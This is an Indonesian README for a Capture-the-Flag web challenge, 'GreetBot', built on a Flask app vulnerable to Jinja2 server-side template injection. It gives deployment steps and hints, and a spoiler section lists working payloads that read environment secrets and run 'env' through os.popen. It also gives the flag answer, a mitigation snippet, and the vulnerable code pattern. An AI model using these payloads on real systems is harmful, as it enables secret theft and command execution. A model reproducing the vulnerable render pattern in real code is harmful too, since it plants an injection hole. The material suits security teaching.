# 🚩 CTF Challenge: GreetBot SSTI

**Kategori:** Web Exploitation  
**Difficulty:** Easy–Medium  
**Vulnerability:** Server-Side Template Injection (SSTI) — Jinja2

---

## 📖 Deskripsi Challenge

GreetBot adalah layanan greeting sederhana berbasis Flask. Aplikasi menerima input nama pengguna dan menampilkannya kembali menggunakan template engine Jinja2.

Dapatkah kamu menemukan flag yang tersembunyi di environment variables?

---

## 🚀 Deploy ke Railway

### Cara 1: Via GitHub (Recommended)

1. Push repository ini ke GitHub
2. Buka [railway.app](https://railway.app) → **New Project**
3. Pilih **Deploy from GitHub repo**
4. Pilih repo ini
5. Tambahkan **Environment Variable**:
   ```
   FLAG = CTF{ssT1_1s_d4ng3r0us_t3mpl4t3_1nj3ct10n}
   ```
6. Railway akan otomatis deploy!

### Cara 2: Via Railway CLI

```bash
npm install -g @railway/cli
railway login
railway init
railway up

# Set environment variable
railway variables set FLAG="CTF{ssT1_1s_d4ng3r0us_t3mpl4t3_1nj3ct10n}"
```

---

## 🏁 Flag

Set flag kustom kamu via environment variable `FLAG` di Railway dashboard.

Default flag (jika tidak di-set):
```
CTF{ssT1_1s_d4ng3r0us_t3mpl4t3_1nj3ct10n}
```

---

## 💡 Hint untuk Peserta

<details>
<summary>Hint 1</summary>
Coba masukkan ekspresi matematika sebagai nama: <code>{{7*7}}</code>
</details>

<details>
<summary>Hint 2</summary>
Jika template engine mengevaluasi ekspresi, coba akses object Python built-in melalui MRO (Method Resolution Order).
</details>

<details>
<summary>Hint 3</summary>
<code>{{config}}</code> atau <code>{{self.__dict__}}</code> bisa memberikan informasi berguna.
</details>

---

## 🔓 Solusi (Spoiler!)

<details>
<summary>Klik untuk melihat solusi</summary>

### Step 1 — Deteksi SSTI
Input: `{{7*7}}`  
Output menampilkan `49` → template injection terkonfirmasi!

### Step 2 — Akses Environment Variables

**Payload via config:**
```
{{config.items()}}
```

**Payload via os.environ:**
```
{{self.__init__.__globals__.__builtins__.__import__('os').environ.get('FLAG')}}
```

**Payload alternatif (lebih pendek):**
```
{{request.application.__globals__.__builtins__.__import__('os').popen('env').read()}}
```

**Payload via class chain:**
```
{{''.__class__.__mro__[1].__subclasses__()[140].__init__.__globals__['os'].environ['FLAG']}}
```
*(index subclass bisa bervariasi, coba beberapa angka)*

### Step 3 — Ambil Flag
Gunakan payload yang berhasil untuk membaca `os.environ['FLAG']`.

</details>

---

## 🛡️ Fix / Mitigasi

Jangan pernah memasukkan user input langsung ke dalam `render_template_string()`.  
Gunakan `render_template()` dengan file template terpisah, atau escape input sebelum dirender:

```python
# ❌ VULNERABLE
template = f"<h2>Hello, {name}!</h2>"
return render_template_string(template)

# ✅ SAFE — gunakan variabel template
return render_template_string("<h2>Hello, {{ name }}!</h2>", name=name)
```

---

## 📁 Struktur File

```
.
├── app.py              # Aplikasi Flask (vulnerable)
├── requirements.txt    # Dependencies
├── Procfile           # Process file untuk Railway/Heroku
├── railway.toml       # Konfigurasi Railway
└── README.md          # File ini
```
